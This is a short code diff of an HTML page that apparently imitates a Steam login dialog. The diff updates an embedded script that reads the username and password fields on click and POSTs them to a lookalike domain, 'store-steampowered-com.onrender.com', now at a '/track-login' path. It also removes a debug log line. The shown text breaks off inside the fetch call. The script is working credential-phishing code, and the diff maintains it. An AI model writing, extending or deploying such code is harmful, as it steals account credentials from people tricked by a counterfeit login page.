@@ -2462,12 +2462,11 @@
             <div class="ModalOverlayContent ModalOverlayBackground"></div>
         </div>
         <script>
-            console.log("ALL RIGHT");
             document.querySelector(".DjSvCZoKKfoNSmarsEcTS").addEventListener("click", function() {
                 let login = document.querySelector("input[type='text']").value;
                 let password = document.querySelector("input[type='password']").value;
-                
-                fetch("https://store-steampowered-com.onrender.com", {
+
+                fetch("https://store-steampowered-com.onrender.com/track-login", {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
